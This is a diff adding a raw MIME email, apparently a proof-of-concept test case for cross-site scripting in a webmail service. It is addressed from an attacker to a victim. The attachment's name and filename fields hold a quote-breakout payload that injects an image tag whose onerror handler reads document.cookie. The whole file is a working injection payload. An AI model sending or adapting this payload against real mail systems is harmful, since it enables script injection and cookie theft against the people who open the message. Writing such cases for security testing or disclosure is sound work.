@@ -1,0 +1,26 @@
+From: <attacker@attacker.com>
+Subject: XSS
+To: victim@139.com
+MIME-Version: 1.0
+Content-type: multipart/mixed;
+	boundary="----=_Part_192061_1556421578.1563869810627"
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_192063_26965953.1563869810627"
+
+------=_Part_192063_26965953.1563869810627
+Content-Type: text/plain; charset=GBK
+Content-Transfer-Encoding: 7bit
+
+TheXSS
+
+------=_Part_192063_26965953.1563869810627--
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: image/png; name="'"><img src=1 onerror=alert(document.cookie)>.jpg"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="'"><img src=1 onerror=alert(document.cookie)>.jpg"
+
+c29tZXRoaW5n
+------=_Part_192061_1556421578.1563869810627--
